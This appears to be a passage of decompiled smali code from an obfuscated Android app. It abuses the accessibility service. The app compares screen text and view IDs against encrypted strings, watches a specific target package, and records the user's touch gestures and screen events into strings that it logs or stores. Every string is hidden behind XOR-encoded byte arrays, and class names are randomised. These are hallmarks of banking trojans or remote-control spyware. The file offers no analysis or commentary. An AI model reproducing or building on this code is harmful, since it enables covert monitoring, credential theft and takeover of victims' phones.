    new-array v1, v1, [B

    fill-array-data v1, :array_10

    new-array v2, v0, [B

    fill-array-data v2, :array_11

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v2

    invoke-interface {v2, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_0

    const/16 v1, 0xd

    new-array v1, v1, [B

    fill-array-data v1, :array_12

    new-array v2, v0, [B

    fill-array-data v2, :array_13

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v2

    invoke-interface {v2, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_0

    const/16 v1, 0x13

    new-array v2, v1, [B

    fill-array-data v2, :array_14

    new-array v4, v0, [B

    fill-array-data v4, :array_15

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v4

    invoke-interface {v4, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_0

    const/16 v2, 0x33

    new-array v2, v2, [B

    fill-array-data v2, :array_16

    new-array v4, v0, [B

    fill-array-data v4, :array_17

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v4

    invoke-interface {v4, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_0

    const/16 v2, 0x23

    new-array v2, v2, [B

    fill-array-data v2, :array_18

    new-array v4, v0, [B

    fill-array-data v4, :array_19

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v4

    invoke-interface {v4, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_0

    new-array p1, p1, [B

    fill-array-data p1, :array_1a

    new-array v2, v0, [B

    fill-array-data v2, :array_1b

    invoke-static {p1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v2

    invoke-interface {v2, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v2

    invoke-virtual {p1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-nez p1, :cond_0

    const/16 p1, 0x1d

    new-array v2, p1, [B

    fill-array-data v2, :array_1c

    new-array v4, v0, [B

    fill-array-data v4, :array_1d

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v4

    invoke-interface {v4, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_0

    new-array v1, v1, [B

    fill-array-data v1, :array_1e

    new-array v2, v0, [B

    fill-array-data v2, :array_1f

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object v2

    invoke-interface {v2, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_0

    new-array p1, p1, [B

    fill-array-data p1, :array_20

    new-array v0, v0, [B

    fill-array-data v0, :array_21

    invoke-static {p1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityRecord;->getText()Ljava/util/List;

    move-result-object p0

    invoke-interface {p0, v3}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object p0

    invoke-virtual {p1, p0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p0

    if-eqz p0, :cond_1

    :cond_0
    new-instance p0, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU$a;

    invoke-direct {p0}, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU$a;-><init>()V

    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/TEh82iEU;->o(Lcom/vknnolqo/p9sv5zvf/CpSLnKGE;)V

    :cond_1
    return-void

    :array_0
    .array-data 1
        0x47t
        -0x3et
        -0x3et
        0x27t
        0x6ft
        0x33t
        -0x38t
        -0x7bt
        0x4bt
        -0x3ct
        -0x35t
        0x27t
        0x7dt
        0x24t
        -0x21t
        -0x7dt
        0x41t
        -0x40t
        -0x26t
        0x60t
    .end array-data

    :array_1
    .array-data 1
        0x24t
        -0x53t
        -0x51t
        0x9t
        0xet
        0x5dt
        -0x54t
        -0x9t
    .end array-data

    :array_2
    .array-data 1
        -0x2t
        -0x29t
        -0x1dt
        0x55t
        -0x79t
        0x55t
        0x32t
        0x47t
        -0x7dt
        -0x57t
        -0x2bt
        0x5t
        -0x3dt
        0x73t
        0x59t
        0x1at
        -0x6dt
        -0x24t
    .end array-data

    nop

    :array_3
    .array-data 1
        0x1bt
        0x4ct
        0x5dt
        -0x4dt
        0x26t
        -0x23t
        -0x2bt
        -0x4t
    .end array-data

    :array_4
    .array-data 1
        -0x12t
        -0x2at
        -0x33t
        0x21t
        -0x66t
        0x6et
        -0x16t
        0x4ft
        -0x5ft
        -0x5et
        -0x8t
        0x7at
        -0x22t
        0x48t
        -0x7ft
        0x10t
        -0x7dt
        -0x26t
    .end array-data

    nop

    :array_5
    .array-data 1
        0xbt
        0x4at
        0x5bt
        -0x39t
        0x3bt
        -0x1at
        0xdt
        -0xat
    .end array-data

    :array_6
    .array-data 1
        -0x72t
        -0x49t
        -0x5et
        -0x5ct
        -0x6dt
        0x4bt
        0x3dt
        0x4bt
        -0x3ft
        -0x3dt
        -0x69t
        -0x4t
        -0x35t
        0x47t
        0x56t
        0x14t
        -0x1dt
        -0x45t
    .end array-data

    nop

    :array_7
    .array-data 1
        0x6bt
        0x2bt
        0x34t
        0x41t
        0x2et
        -0x17t
        -0x26t
        -0xet
    .end array-data

    :array_8
    .array-data 1
        0x46t
        -0x58t
        -0x21t
        0x59t
        -0x7et
        0x27t
        0x7at
        -0x41t
        0x19t
        -0x9t
        -0x36t
        0x1dt
        -0x2t
        0x2t
        0x9t
        -0x23t
        0x3ft
        -0x77t
        -0x75t
        0x1ft
        -0x61t
    .end array-data

    nop

    :array_9
    .array-data 1
        -0x5dt
        0x1ft
        0x6dt
        -0x42t
        0x17t
        -0x74t
        -0x61t
        0x38t
    .end array-data

    :array_a
    .array-data 1
        -0x2bt
        0x2t
        -0x7dt
        -0x2ct
        -0x7bt
        0x0t
        0x1dt
        0x2t
        -0x76t
        0x5dt
        -0x6at
        -0x70t
        -0x7t
        0x25t
        0x6et
        0x60t
        -0x54t
        0x23t
        -0x2ct
        -0x72t
        -0x4et
    .end array-data

    nop

    :array_b
    .array-data 1
        0x30t
        -0x4bt
        0x31t
        0x33t
        0x10t
        -0x55t
        -0x8t
        -0x7bt
    .end array-data

    :array_c
    .array-data 1
        0x7ct
        -0x53t
        -0x7et
        0x63t
        -0x62t
        0x17t
        0x49t
        -0x1et
        0x23t
        -0x33t
        -0x70t
        0x33t
        -0x1t
        0x29t
        0x26t
        -0x7ct
        0x31t
        -0x5et
        -0x9t
        0x3at
        -0x66t
        0x4bt
        0x2bt
        -0xat
        0x7ct
        -0x51t
        -0x53t
        0x63t
        -0x63t
        0x3ft
        0x49t
        -0x20t
        0x0t
    .end array-data

    nop

    :array_d
    .array-data 1
        -0x61t
        0x2et
        0x13t
        -0x80t
        0x1ct
        -0x58t
        -0x56t
        0x61t
    .end array-data

    :array_e
    .array-data 1
        0x51t
        0x6dt
        0x49t
        -0x5ft
        0x77t
        -0x7dt
        -0x50t
        -0x5t
        0xet
        0xdt
        0x5bt
        -0xft
        0x16t
        -0x43t
        -0x3t
        -0x62t
        0x3dt
        0x61t
        0x3ft
        -0x2at
        0x4et
        -0x21t
        -0x2et
        -0xct
        0x57t
        0x40t
        0x54t
        -0x5at
        0x4ft
        -0x46t
        -0x50t
        -0x7t
        0x25t
        0xdt
        0x59t
        -0x4t
        0x16t
        -0x43t
        -0x3ct
        -0x65t
        0x33t
        0x71t
    .end array-data

    nop

    :array_f
    .array-data 1
        -0x4et
        -0x12t
        -0x28t
        0x42t
        -0xbt
        0x3ct
        0x53t
        0x78t
    .end array-data

    :array_10
    .array-data 1
        -0x79t
        -0x55t
        0x61t
        -0x14t
        -0x79t
        -0xft
        -0x16t
        0x78t
        -0x4ct
        -0x5bt
        0x78t
        -0x18t
        -0x72t
        -0x1at
        -0x10t
        0x3dt
        -0x4dt
    .end array-data

    nop

    :array_11
    .array-data 1
        -0x29t
        -0x36t
        0x15t
        -0x68t
        -0x1et
        -0x7dt
        -0x7ct
        0x58t
    .end array-data

    :array_12
    .array-data 1
        -0x47t
        0x77t
        0x5ct
        0x60t
        0x51t
        -0x27t
        0x34t
        -0x15t
        -0x33t
        0x7ft
        0x1ft
        0x2et
        0x59t
    .end array-data

    nop

    :array_13
    .array-data 1
        0x54t
        -0x5t
        -0xct
        -0x73t
        -0x2bt
        0x6dt
        0x14t
        0x7t
    .end array-data

    :array_14
    .array-data 1
        0x7ft
        -0x78t
        -0x60t
        -0x44t
        -0x15t
        0x27t
        -0x58t
        0x30t
        0x26t
        0x24t
        -0x1ct
        -0x38t
        -0x15t
        0x78t
        -0x19t
        0x21t
        0x79t
        -0x6ct
        -0x60t
    .end array-data

    :array_15
    .array-data 1
        -0x6et
        0x4t
        0x8t
        0x51t
        0x6ft
        -0x6dt
        0x44t
        -0x53t
    .end array-data

    :array_16
    .array-data 1
        -0x6at
        -0x38t
        -0x72t
        -0x63t
        -0x58t
        -0x7ft
        -0x6ft
        -0x39t
        -0x39t
        -0x6bt
        -0x6ft
        -0x12t
        -0xat
        -0x51t
        -0x6t
        -0x67t
        -0x35t
        -0x29t
        -0x34t
        -0x40t
        -0x5ct
        -0xdt
        -0x34t
        -0x21t
        -0x6at
        -0x37t
        -0x59t
        -0x63t
        -0x55t
        -0x7bt
        -0x6ft
        -0x39t
        -0x3ct
        -0x6bt
        -0x6ft
        -0x31t
        -0xat
        -0x52t
        -0x29t
        -0x67t
        -0x36t
        -0x2t
        -0x34t
        -0x40t
        -0x74t
        -0xdt
        -0x34t
        -0x25t
        -0x6at
        -0x37t
        -0x5ft
    .end array-data

    :array_17
    .array-data 1
        0x76t
        0x75t
        0x2ct
        0x7dt
        0x16t
        0x13t
        0x71t
        0x79t
    .end array-data

    :array_18
    .array-data 1
        -0x8t
        0x7at
        0x79t
        0x6ft
        0x67t
        0x12t
        0x6dt
        -0x27t
        -0x7t
        0x55t
        0x7at
        0x48t
        0x65t
        0x1t
        -0x6bt
        -0x52t
        -0x76t
        0x4t
        0x5t
        0x23t
        0x3bt
        0x4ct
        0x12t
        -0x51t
        -0x5bt
        0x5t
        0x26t
        0x22t
        0x19t
        0x4dt
        0x33t
        -0x52t
        -0x71t
        0x5t
        0x2bt
    .end array-data

    :array_19
    .array-data 1
        0x20t
        -0x24t
        -0x5et
        -0x6t
        -0x42t
        -0x6ct
        -0x4bt
        0x76t
    .end array-data

    :array_1a
    .array-data 1
        0x2ct
        -0x1t
        -0x31t
        -0x74t
        -0x2bt
        0x71t
        -0x59t
        0x59t
        -0x34t
        -0x1t
        -0x7ft
        -0x75t
        -0x2at
        0x24t
        -0x5ct
        -0x5t
        0xbt
        -0x1et
        0x62t
        0x4ct
        -0x2at
    .end array-data

    nop

    :array_1b
    .array-data 1
        0x6ft
        -0x70t
        -0x5ft
        -0x11t
        -0x47t
        0x4t
        -0x2ct
        -0x66t
    .end array-data

    :array_1c
    .array-data 1
        0x69t
        0x4t
        0x55t
        -0x61t
        0x52t
        0x75t
        -0xft
        0x13t
        0x49t
        0xet
        0x6t
        -0x76t
        0x5dt
        0x79t
        -0x14t
        -0x10t
        -0x72t
        0xet
        0x6t
        -0x67t
        0x53t
        0x73t
        -0x3t
        0x5ft
        0x58t
        -0x5et
        -0x75t
        -0x62t
        0x53t
    .end array-data

    nop

    :array_1d
    .array-data 1
        0x2dt
        0x61t
        0x26t
        -0x6t
        0x3ct
        0x1dt
        -0x62t
        0x33t
    .end array-data

    :array_1e
    .array-data 1
        -0x77t
        -0x3t
        -0x62t
        0x3et
        0x30t
        -0x2ct
        0x50t
        0x6ct
        -0x53t
        -0x3t
        -0x69t
        0x2dt
        -0x62t
        0x1bt
        0x5et
        0x22t
        -0x43t
        0x58t
        0x4bt
    .end array-data

    :array_1f
    .array-data 1
        -0x27t
        -0x64t
        -0x6t
        0x4ct
        -0xdt
        0x77t
        0x3ft
        0x4ct
    .end array-data

    :array_20
    .array-data 1
        -0x5dt
        0x6et
        -0xct
        -0x1ct
        0x12t
        0x61t
        0x1ft
        -0x48t
        -0x7dt
        0x64t
        -0x59t
        -0xft
        0x1dt
        0x6dt
        0x2t
        0x5bt
        0x44t
        0x64t
        -0x59t
        -0x1et
        0x13t
        0x67t
        0x13t
        -0xct
        -0x6et
        -0x38t
        0x2at
        -0x1bt
        0x13t
    .end array-data

    nop

    :array_21
    .array-data 1
        -0x19t
        0xbt
        -0x79t
        -0x7ft
        0x7ct
        0x9t
        0x70t
        -0x68t
    .end array-data
.end method

.method private static m(Landroid/view/accessibility/AccessibilityEvent;Lcom/vknnolqo/p9sv5zvf/SM099EXd;)V
    .locals 5

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->d:Landroid/view/accessibility/AccessibilityNodeInfo;

    const/16 v1, 0x29

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v3, v2, [B

    fill-array-data v3, :array_1

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    if-eqz v0, :cond_0

    invoke-interface {v0}, Ljava/util/List;->isEmpty()Z

    move-result v1

    if-eqz v1, :cond_1

    :cond_0
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->d:Landroid/view/accessibility/AccessibilityNodeInfo;

    const/16 v1, 0x2f

    new-array v1, v1, [B

    fill-array-data v1, :array_2

    new-array v3, v2, [B

    fill-array-data v3, :array_3

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    :cond_1
    const/4 v1, 0x0

    if-eqz v0, :cond_3

    invoke-interface {v0}, Ljava/util/List;->isEmpty()Z

    move-result v3

    if-nez v3, :cond_3

    invoke-interface {v0, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-eqz v3, :cond_3

    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->isVisibleToUser()Z

    move-result v3

    if-eqz v3, :cond_3

    if-nez p1, :cond_2

    sput-object p1, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->b:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    :cond_2
    sget-object p1, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->d:Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-static {v0, p1}, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->q(Ljava/util/List;Landroid/view/accessibility/AccessibilityNodeInfo;)V

    :cond_3
    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result p1

    const/16 v0, 0x20

    if-ne p1, v0, :cond_6

    const/16 p1, 0x14

    new-array p1, p1, [B

    fill-array-data p1, :array_4

    new-array v3, v2, [B

    fill-array-data v3, :array_5

    invoke-static {p1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;

    move-result-object v3

    invoke-virtual {p1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_6

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityEvent;->getContentChangeTypes()I

    move-result p0

    if-ne p0, v0, :cond_6

    sput-boolean v1, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->V:Z

    new-instance p0, Ljava/lang/StringBuilder;

    const/16 p1, 0xb

    new-array p1, p1, [B

    fill-array-data p1, :array_6

    new-array v0, v2, [B

    fill-array-data v0, :array_7

    invoke-static {p1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-direct {p0, p1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/z40;->c()Ljava/util/LinkedList;

    move-result-object p1

    move v0, v1

    :goto_0
    invoke-virtual {p1}, Ljava/util/LinkedList;->size()I

    move-result v3

    if-ge v0, v3, :cond_4

    sget-object v3, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->c:Ljava/util/LinkedList;

    invoke-virtual {p1, v0}, Ljava/util/LinkedList;->get(I)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/m7;

    invoke-virtual {v3, v4}, Ljava/util/LinkedList;->add(Ljava/lang/Object;)Z

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p1, v0}, Ljava/util/LinkedList;->get(I)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/m7;

    invoke-virtual {v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/m7;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, "\r\n"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    :cond_4
    sget-object p1, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->c:Ljava/util/LinkedList;

    invoke-virtual {p1}, Ljava/util/AbstractCollection;->isEmpty()Z

    move-result p1

    if-nez p1, :cond_5

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->o()V

    :cond_5
    invoke-virtual {p0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    new-array p1, v1, [Ljava/lang/Object;

    invoke-static {p0, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/es;->a(Ljava/lang/String;[Ljava/lang/Object;)V

    sget-object p0, Lcom/vknnolqo/p9sv5zvf/GBPjHfKu;->n:Landroid/content/Context;

    const/4 p1, 0x3

    new-array p1, p1, [B

    fill-array-data p1, :array_8

    new-array v0, v2, [B

    fill-array-data v0, :array_9

    invoke-static {p1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    const/4 v0, 0x1

    new-array v0, v0, [B

    const/16 v3, -0x6c

    aput-byte v3, v0, v1

    new-array v1, v2, [B

    fill-array-data v1, :array_a

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, p1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/z40;->k()V

    sget-object p0, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->c:Ljava/util/LinkedList;

    invoke-virtual {p0}, Ljava/util/LinkedList;->clear()V

    :cond_6
    return-void

    nop

    :array_0
    .array-data 1
        0x23t
        -0x23t
        0x2et
        -0x73t
        0x1dt
        -0x2et
        0x39t
        0x75t
        0x2ft
        -0x25t
        0x27t
        -0x73t
        0xft
        -0x3bt
        0x2et
        0x73t
        0x25t
        -0x21t
        0x36t
        -0x36t
        0x46t
        -0x2bt
        0x39t
        0x28t
        0x2ct
        -0x23t
        0x20t
        -0x38t
        0x23t
        -0x28t
        0x34t
        0x60t
        0x29t
        -0x3at
        0x22t
        -0x31t
        0x23t
        -0x36t
        0x34t
        0x62t
        0x37t
    .end array-data

    nop

    :array_1
    .array-data 1
        0x40t
        -0x4et
        0x43t
        -0x5dt
        0x7ct
        -0x44t
        0x5dt
        0x7t
    .end array-data

    :array_2
    .array-data 1
        -0xft
        0x7ft
        -0xdt
        -0x12t
        0x3at
        -0x42t
        -0x25t
        -0x2dt
        -0x3t
        0x79t
        -0x6t
        -0x12t
        0x28t
        -0x57t
        -0x34t
        -0x2bt
        -0x9t
        0x7dt
        -0x15t
        -0x57t
        0x61t
        -0x47t
        -0x25t
        -0x72t
        -0x1et
        0x79t
        -0x10t
        -0x7dt
        0x34t
        -0x44t
        -0x30t
        -0x2dt
        -0x24t
        0x65t
        -0xdt
        -0x5bt
        0x29t
        -0x47t
        -0x24t
        -0x16t
        -0x9t
        0x69t
        -0x4t
        -0x51t
        0x3at
        -0x5et
        -0x25t
    .end array-data

    :array_3
    .array-data 1
        -0x6et
        0x10t
        -0x62t
        -0x40t
        0x5bt
        -0x30t
        -0x41t
        -0x5ft
    .end array-data

    :array_4
    .array-data 1
        -0x29t
        -0x60t
        0x76t
        0x43t
        -0x2ft
        0x61t
        -0x50t
        0x4bt
        -0x25t
        -0x5at
        0x7ft
        0x43t
        -0x3dt
        0x76t
        -0x59t
        0x4dt
        -0x2ft
        -0x5et
        0x6et
        0x4t
    .end array-data

    :array_5
    .array-data 1
        -0x4ct
        -0x31t
        0x1bt
        0x6dt
        -0x50t
        0xft
        -0x2ct
        0x39t
    .end array-data

    :array_6
    .array-data 1
        -0x78t
        -0x5at
        0x11t
        0x6dt
        0x79t
        -0x7dt
        -0x22t
        -0x45t
        -0xbt
        0x10t
        -0x78t
    .end array-data

    :array_7
    .array-data 1
        0x6ft
        0x1dt
        -0x7et
        -0x75t
        -0x19t
        0x1ft
        0x31t
        0x7t
    .end array-data

    :array_8
    .array-data 1
        -0x78t
        -0x4bt
        -0x2t
    .end array-data

    :array_9
    .array-data 1
        -0x17t
        -0x3at
        -0x66t
        -0x7ft
        -0x74t
        0x9t
        -0x4ft
        0x7t
    .end array-data

    :array_a
    .array-data 1
        -0x60t
        0x23t
        -0x5ft
        0x7t
        -0x51t
        -0x70t
        0x47t
        0x32t
    .end array-data
.end method

.method private static n()V
    .locals 7

    .line 1
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const/4 v1, 0x0

    move v2, v1

    :goto_0
    sget-object v3, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->a:Ljava/util/LinkedList;

    invoke-virtual {v3}, Ljava/util/LinkedList;->size()I

    move-result v3

    if-ge v2, v3, :cond_3

    sget-object v3, Lcom/vknnolqo/p9sv5zvf/I6CeHbgU;->a:Ljava/util/LinkedList;

    invoke-virtual {v3, v2}, Ljava/util/LinkedList;->get(I)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Ljava/util/LinkedList;

    move v4, v1

    :goto_1
    invoke-virtual {v3}, Ljava/util/LinkedList;->size()I

    move-result v5

    const/16 v6, 0x8

    if-ge v4, v5, :cond_1

    invoke-virtual {v3, v4}, Ljava/util/LinkedList;->get(I)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Landroid/view/MotionEvent;

    invoke-static {v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/eq;->d(Landroid/view/MotionEvent;)Lorg/json/JSONObject;

    move-result-object v5

    invoke-virtual {v0, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/util/LinkedList;->size()I

    move-result v5

    add-int/lit8 v5, v5, -0x1

    if-eq v4, v5, :cond_0

    const/16 v5, 0x9

    new-array v5, v5, [B

    fill-array-data v5, :array_0

    new-array v6, v6, [B

    fill-array-data v6, :array_1

